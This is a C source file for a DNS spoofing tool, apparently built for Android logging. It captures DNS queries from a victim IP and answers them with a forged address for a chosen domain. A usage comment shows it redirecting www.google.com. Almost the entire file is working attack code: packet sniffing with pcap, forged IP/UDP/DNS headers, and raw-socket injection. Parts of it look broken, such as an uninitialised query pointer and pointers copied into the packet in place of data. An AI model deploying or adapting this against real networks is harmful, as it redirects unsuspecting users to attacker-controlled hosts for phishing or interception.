/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 * 
 * 
 * ./dns-spoof -v 192.168.0.19 -r www.google.com -a 192.168.0.19
 */

/* 
 * File:   dns-spoof.c
 * Author: jb
 *
 * Created on March 30, 2016, 9:38 PM
 */

#include "dns-spoof.h"

char* get_device() {
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev;

    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        submit_log("pcap_lookupdev => errbuf: [%s]\n", errbuf);
        return NULL;
    }

    submit_log("Device: [%s]\n", dev);

    return dev;
}

void* pcap_setup(char *filter) {
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    pcap_t *nic_descr;
    int loop_ret;
    bpf_u_int32 mask; //The netmask of our sniffing device
    bpf_u_int32 net; //The IP of our sniffing device 

    dev = get_device();

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        submit_log("Can't get netmask for device: [%s]\n", dev);
        net = 0;
        mask = 0;
        exit(1);
    }

    nic_descr = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
    if (nic_descr == NULL) {
        submit_log("pcap_open_live() => errbuf: [%s] \n", errbuf);
        exit(1);
    }
    submit_log("pcap_open_live(): [%s]\n", "Running this function");

    if (filter == NULL) {
        // start pcap_loop
        loop_ret = pcap_loop(nic_descr, -1, pkt_callback, NULL);
        submit_log_i("pcap_loop(): loop_ret = [%d]\n", loop_ret);
    } else {
        // setup the filter
        if (pcap_compile(nic_descr, &fp, filter, 0, net) == -1) {
            submit_log("pcap_setup(): pcap_compile() => Error Calling PCAP_COMPILE() => FILTER = [%s] \n", filter);
            exit(1);
        }

        if (pcap_setfilter(nic_descr, &fp) == -1) {
            submit_log("pcap_setup(): pcap_setfilter() => [%s] \n", "Error Calling PCAP_SETFILTER()");
            exit(1);
        }

        loop_ret = pcap_loop(nic_descr, -1, pkt_callback, NULL);
        submit_log_i("pcap_loop(): loop_ret = [%d]\n", loop_ret);
    }
}

struct my_header* init_header() {
    struct my_header* my_hdr = malloc(sizeof (struct my_header));
    return my_hdr;
}

void pkt_callback(u_char *args, const struct pcap_pkthdr *pkt_hdr, const u_char* packet) {
    static int count = 1;

    u_int16_t type = handle_ethernet(pkt_hdr, packet);

    if (type == ETHERTYPE_IP) {
        handle_IP(pkt_hdr, packet);
    } else if (type == ETHERTYPE_ARP) {
        fprintf(stderr, "Packet type = [%s]\n", "ARP");
    } else if (type == ETHERTYPE_REVARP) {
        fprintf(stderr, "Packet type = [%s]\n", "RARP");
    }

    count++;
}

u_int16_t handle_ethernet(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    u_int caplen = pkthdr->caplen;
    struct sniff_ethernet *ethernet;
    u_short ether_type;

    if (caplen < ETHER_HDRLEN) {
        submit_log_i("handle_ethernet() => Packet length is less than Ethernet Header Length [%d]\n", caplen);
        return -1;
    }

    // Getting access to Ethernet Packet
    ethernet = (struct sniff_ethernet *) packet;

    ether_type = ntohs(ethernet->ether_type);

    return ether_type;
}

u_char* handle_IP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct my_ip *ip;
    struct ether_header *ether;
    u_int length = pkthdr->len;
    u_int hlen, off, version;
    int len;

    //fprintf(stderr, "%s", "    |> handle_ip()\n");

    ether = (struct ether_header *) (packet);

    memcpy(header_info->src_mac, ether->ether_shost, ETH_ALEN);
    memcpy(header_info->dst_mac, ether->ether_dhost, ETH_ALEN);
    ;
    header_info->type = ETHERTYPE_IP;

    // Jump to IP packet packet + ETHER_HDRLEN
    ip = (struct my_ip *) (packet + ETHER_HDRLEN);
    length -= ETHER_HDRLEN;
    if (length < sizeof (struct my_ip)) {
        submit_log_i("handle_IP(): Truncated IP Length = [%d]\n", length);
        return NULL;
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip); // get header length
    version = IP_V(ip); // get IP version number

    //verify version
    if (version != 4) {
        submit_log_i("handle_IP(): Unknown version [%d]\n", version);
        return NULL;
    }

    // verify the header length
    if (hlen < 5) {
        submit_log_i("handle_IP(): Bad Header length [%d]\n", hlen);
        return NULL;
    }

    if (length < len) {
        submit_log_i("handle_IP(): Truncated IP Packet - [%d] bytes missing \n", len - length);
    }

    // Ensure that the first fragment is present
    off = ntohs(ip->ip_off);
    if ((off & 0x1fff) == 0) {
        // Do something with the first IP fragment
    }

    /* determine protocol */
    switch (ip->ip_p) {
        case IPPROTO_UDP:
            submit_log("handle_IP(): Protocol: [%s]\n", "UDP");
            handle_UDP(pkthdr, packet);
            break;
        default:
            submit_log("handle_IP(): Protocol: [%s]\n", "unknown");
            break;
    }
}

u_char* handle_UDP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct udp_hdr *udp;
    struct my_ip *ip;
    struct sniff_ethernet *ethernet;
    int udp_len, ip_len;
    char *dns_pkt;
    u_int caplen = pkthdr->caplen;

    //submit_log("%s", "handle_udp()\n");

    ethernet = (struct sniff_ethernet *) packet;

    ip = (struct my_ip *) (packet + ETHER_HDRLEN);
    ip_len = IP_HL(ip) * 4;

    caplen -= (ETHER_HDRLEN + ip_len);

    udp = (struct udp_hdr *) (packet + ETHER_HDRLEN + ip_len);
    udp_len = sizeof (struct udp_hdr);

    if (caplen < udp_len) {
        submit_log_i("handle_UDP(): Invalid UDP Header length: [%d] bytes\n", caplen);
        return NULL;
    }

    dns_pkt = (char *) (packet + ETHER_HDRLEN + ip_len + udp_len);

    handle_DNS(packet);
}

void handle_DNS(const char* packet) {
    struct dns_query *dnsquery;
    struct udp_hdr *udp;
    struct my_ip *ip;
    struct sniff_ethernet *ethernet;
    int ip_len;
    char *url;

    url = allocate_strmem(REQUEST_SIZE);

    //submit_log("%s", "handle_dns()\n");

    ethernet = (struct sniff_ethernet *) packet;

    ip = (struct my_ip *) (packet + ETHER_HDRLEN);
    ip_len = IP_HL(ip) * 4;

    extract_ip_from_iphdr(ip);

    udp = (struct udp_hdr *) (packet + ETHER_HDRLEN + ip_len);
    header_info->src_port = udp->uh_sport;

    dnsquery->qname = (char *) (packet + ETHER_HDRLEN + ip_len + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER));

    url = extract_dns_request(dnsquery);
    header_info->url_query = url;

    if (strcmp(header_info->url_query, header_info->request) == 0) {
        //fprintf(stderr, "URL Match found\n");
        build_response_packet(dnsquery);
    }
}

/**
 * Extracts an ip from a ip header
 */
void extract_ip_from_iphdr(struct my_ip* ip) {
    header_info->ip_src = ip->ip_src;
    header_info->ip_dst = ip->ip_dst;
}

/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[7]example[3]com[0]
 * And it is returned in this: www.example.com
 */
char* extract_dns_request(struct dns_query *dnsquery) {
    unsigned int i, j, k;
    char *curr = dnsquery->qname;
    unsigned int size;
    char *request;

    request = allocate_strmem(REQUEST_SIZE);

    size = curr[0];

    submit_log_i("%d", size);

    j = 0;
    i = 1;
    while (size > 0) {
        for (k = 0; k < size; k++) {
            request[j++] = curr[i + k];
        }
        request[j++] = '.';
        i += size;
        size = curr[i++];
    }
    request[--j] = '\0';

    submit_log("extract_dns_request() URL : %s\n", request);
    fprintf(stderr, "URL: %s\n", request);

    return request;
}

void build_ip_hdr(uint8_t *datagram) {
    struct ip *send_iphdr = (struct ip *) (datagram + ETHER_HDRLEN);
    int *ip_flags, status, id;
    time_t t;

    srand((unsigned) time(&t)); /* Intializes random number generator */
    id = rand() % 9999 + 1;

    ip_flags = allocate_intmem(4);
    send_iphdr->ip_hl = IP4_HDRLEN / sizeof (uint32_t); // IPv4 header length (4 bits): Number of 32-bit words in header = 5
    send_iphdr->ip_v = 4; // Internet Protocol version (4 bits): IPv4
    send_iphdr->ip_tos = 0; // Type of service (8 bits)
    //    send_iphdr->ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct RES_RECORD)); // Total length of datagram (16 bits): IP header + ICMP header + ICMP data
    send_iphdr->ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct dns_response)); // Total length of datagram (16 bits): IP header + UDP header + UDP data (DNS HDR + QUERY + ANSWER)
    send_iphdr->ip_id = htons(id); // ID sequence number (16 bits): unused, since single datagram
    ip_flags[0] = 0; // Zero (1 bit)
    ip_flags[1] = 1; // Do not fragment flag (1 bit)
    ip_flags[2] = 0; // More fragments following flag (1 bit)
    ip_flags[3] = 0; // Fragmentation offset (13 bits)
    send_iphdr->ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + ip_flags[3]); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
    send_iphdr->ip_ttl = 64; // Time-to-Live (8 bits): default to maximum value
    send_iphdr->ip_p = UDP_PKT; // UDP Packet Type
    send_iphdr->ip_src = header_info->ip_dst;
    send_iphdr->ip_dst = header_info->ip_src;
    send_iphdr->ip_sum = 0;
    send_iphdr->ip_sum = ipv4_checksum((uint16_t *) & send_iphdr, IP4_HDRLEN); // IPv4 header checksum (16 bits): set to 0 when calculating checksum
}

void build_udp_hdr(uint8_t *datagram) {
    struct udp_hdr *udp = (struct udp_hdr *) (datagram + ETHER_HDRLEN + IP4_HDRLEN);

    udp->uh_sport = htons(53);
    udp->uh_dport = header_info->src_port;
    udp->uh_ulen = htons(sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query) + sizeof (struct RES_RECORD));
    udp->uh_sum = 0;
    udp->uh_sum = ipv4_checksum((uint16_t *) & udp, sizeof (struct udp_hdr));
}

void build_dns_answer(uint8_t *datagram, struct dns_query *query) {
    unsigned int size = 0;
    struct DNS_HEADER dns_hdr;
    struct dns_query dns_query;
    struct RES_RECORD response;
    struct R_DATA rdata;
    struct dns_response *dns_response = (struct dns_response *) (datagram + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr));
    unsigned char ans[4];

    sscanf(header_info->response, "%d.%d.%d.%d", (int *) &ans[0], (int *) &ans[1], (int *) &ans[2], (int *) &ans[3]);

    dns_hdr.id = (unsigned short) htons(getpid()); // ID
    dns_hdr.qr = 1; // We give a response, Volgens RFC: (= query (0), or a response (1).)
    dns_hdr.opcode = 0; // default
    dns_hdr.aa = 0; //Not Authoritative,RFC: (= Authoritative Answer - this bit is valid in responses, and specifies that the responding name server is an authority for the domain name in question section.)
    dns_hdr.tc = 0; // Not truncated
    dns_hdr.rd = 1; // Enable recursion
    dns_hdr.ra = 0; // Nameserver supports recursion?
    dns_hdr.z = 0; //  RFC: (= Reserved for future use.  Must be zero in all queries and responses.)
    dns_hdr.rcode = 0; // No error condition
    dns_hdr.q_count = 0; // No questions!
    dns_hdr.ad = 0; // How man resource records?
    dns_hdr.cd = 0; // !checking
    dns_hdr.ans_count = 1; // We give 1 answer
    dns_hdr.auth_count = 0; // How many authority entries?
    dns_hdr.add_count = 0; // How many resource entries?

    strcpy(dns_query.qclass, query->qclass);
    dns_query.qname = query->qname;
    //strcpy(dns_query.qname, query->qname);
    strcpy(dns_query.qtype, query->qtype);

    response.name = query->qname;
    rdata._class = htons(1);
    rdata.type = htons(1);
    rdata.data_len = htons(4);
    rdata.ttl = 30;
    response.resource = &rdata;
    memcpy(&response.rdata, ans, 4);

    dns_response->_hdr = &dns_hdr;
    dns_response->_query = &dns_query;
    dns_response->_response = &response;
}

void build_response_packet(struct dns_query *query) {
    //char *datagram;
    uint8_t *datagram;
    unsigned int datagram_size;
    struct ether_header *eth_hdr;

    datagram = allocate_strmem(IP_MAXPACKET);

    eth_hdr = (struct ether_header *) (datagram);

    memcpy(eth_hdr->ether_dhost, header_info->src_mac, ETH_ALEN);
    memcpy(eth_hdr->ether_shost, header_info->dst_mac, ETH_ALEN);
    eth_hdr->ether_type = header_info->type;

    build_ip_hdr(datagram);
    build_udp_hdr(datagram);
    build_dns_answer(datagram, query);

    datagram_size = ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct dns_response);

    //sends our DNS Spoof MSG
    send_dns_answer(header_info->ip_src, header_info->src_port, datagram, datagram_size);

}

void send_dns_answer(struct in_addr ip, u_short port, uint8_t* packet, int packlen) {
    int sendsd, bytes_sent;
    struct sockaddr_ll device;

    sendsd = create_raw_socket(ETH_P_ALL);
    memset(&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex(header_info->interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index \n");
        exit(EXIT_FAILURE);
    }

    // Fill out sockaddr_ll.
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, header_info->dst_mac, 6);
    device.sll_halen = 6;

    if ((bytes_sent = sendto(sendsd, packet, packlen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
        fprintf(stderr, "%s\n", "sendto() failed ");
        exit(EXIT_FAILURE);
    }
}

//void send_dns_answer(struct in_addr ip, u_short port, char* packet, int packlen) {
//    struct sockaddr_in to_addr;
//    int bytes_sent;
//    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
//    int one = 1;
//    const int *val = &one;
//
//    if (sock < 0) {
//        submit_log("%s\n", "Error creating socket");
//        exit(EXIT_FAILURE);
//    }
//
//    to_addr.sin_family = AF_INET;
//    to_addr.sin_port = port;
//    to_addr.sin_addr = ip;
//
//    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
//        submit_log("%s\n", "Error at setsockopt()");
//        exit(EXIT_FAILURE);
//    }
//
//    bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *) &to_addr, sizeof (to_addr));
//
//    if (bytes_sent < 0) {
//        fprintf(stderr, "Error Sending Data");
//    }
//}

int create_raw_socket(int socket_type) {
    int raw;

    if ((raw = socket(PF_PACKET, SOCK_RAW, htons(socket_type))) < 0) {
        submit_log("9. [%s]\n", "Socket(): failed to get socket descriptor for using ioctl()");
        exit(EXIT_FAILURE);
    }

    return raw;
}

uint8_t* get_mac_addr(int socket, char *interface) {
    uint8_t *src_mac;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof (ifr));
    bzero(&ifr, sizeof (ifr));

    src_mac = allocate_ustrmem(ETHER_ADDR_LEN);

    strncpy((char *) ifr.ifr_name, interface, IFNAMSIZ);

    if ((ioctl(socket, SIOCGIFHWADDR, &ifr)) == -1) {
        submit_log("10. create_raw_socket(): [%s]\n", "Error getting HW ADDR");
        exit(EXIT_FAILURE);
    }
    memcpy(src_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN * sizeof (uint8_t));

    return src_mac;
}

/*
 * Main Function
 */
int main(int argc, char** argv) {
    char *filter = NULL; // PCAP Filter
    char *victim_ip = NULL; // Victim Machine
    int c, status;

    if (argc < 9) {
        fprintf(stderr, "Use\n    -i for network interface\nAND -v for Victim IP Address \nAND -r for the domain \nAND -a for the spoofed address\n");
        return (EXIT_FAILURE);
    }

    header_info = init_header();

    while ((c = getopt(argc, argv, "i:v:r:a:")) != -1) {
        switch (c) {
            case 'i':
                header_info->interface = optarg;
                break;
            case 'v': // Victim machines IP address
                victim_ip = optarg;
                break;
            case 'r': // Domain name you want to spoof
                header_info->request = optarg;
                break;
            case 'a': // Address you want to send in the answer
                header_info->response = optarg;
                break;
            case '?':
                submit_log("%s", "arguments missing");
                return EXIT_FAILURE;
        }
    }


    if ((status = asprintf(&filter, "%s%s", "udp and port 53 and src ", victim_ip)) < 0) {
        fprintf(stderr, "Unable to get the Victim IP Address");
    }

    fprintf(stderr, "Filter     :   %s\n", filter);
    fprintf(stderr, "Request    :   %s\n", header_info->request);
    fprintf(stderr, "Response   :   %s\n", header_info->response);


    //filter = "udp and port 53 and src 192.168.0.19";

    pcap_setup(filter);

    return (EXIT_SUCCESS);
}

uint16_t ipv4_checksum(uint16_t *addr, int len) {
    int count = len;
    register uint32_t sum = 0;
    uint16_t answer = 0;

    // Sum up 2-byte values until none or only one byte left.
    while (count > 1) {
        sum += *(addr++);
        count -= 2;
    }

    // Add left-over byte, if any.
    if (count > 0) {
        sum += *(uint8_t *) addr;
    }

    // Fold 32-bit sum into 16 bits; we lose information by doing this,
    // increasing the chances of a collision.
    // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    // Checksum is one's compliment of sum.
    answer = ~sum;

    return (answer);
}

uint8_t * allocate_ustrmem(int len) {
    void *tmp;

    if (len <= 0) {
        fprintf(stderr, "13. ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
        exit(EXIT_FAILURE);
    }

    tmp = (uint8_t *) malloc(len * sizeof (uint8_t));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof (uint8_t));
        return (tmp);
    } else {
        fprintf(stderr, "14. ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
        exit(EXIT_FAILURE);
    }
}


// Allocate memory for an array of chars.

char * allocate_strmem(int len) {
    void *tmp;

    if (len <= 0) {
        fprintf(stderr, "15. ERROR: Cannot allocate memory because len = %i in allocate_strmem().\n", len);
        exit(EXIT_FAILURE);
    }

    tmp = (char *) malloc(len * sizeof (char));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof (char));
        return (tmp);
    } else {
        fprintf(stderr, "16. ERROR: Cannot allocate memory for array allocate_strmem().\n");
        exit(EXIT_FAILURE);
    }
}

// Allocate memory for an array of ints.

int* allocate_intmem(int len) {
    void *tmp;

    if (len <= 0) {
        fprintf(stderr, "17. ERROR: Cannot allocate memory because len = %i in allocate_intmem().\n", len);
        exit(EXIT_FAILURE);
    }

    tmp = (int *) malloc(len * sizeof (int));
    if (tmp != NULL) {
        memset(tmp, 0, len * sizeof (int));
        return (tmp);
    } else {
        fprintf(stderr, "18. ERROR: Cannot allocate memory for array allocate_intmem().\n");
        exit(EXIT_FAILURE);
    }
}

int submit_log(char *msgType, char *string) {
    __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, msgType, string);
    return 0;
}

int submit_log_i(char *msgType, int value) {
    __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, msgType, value);
    return 0;
}

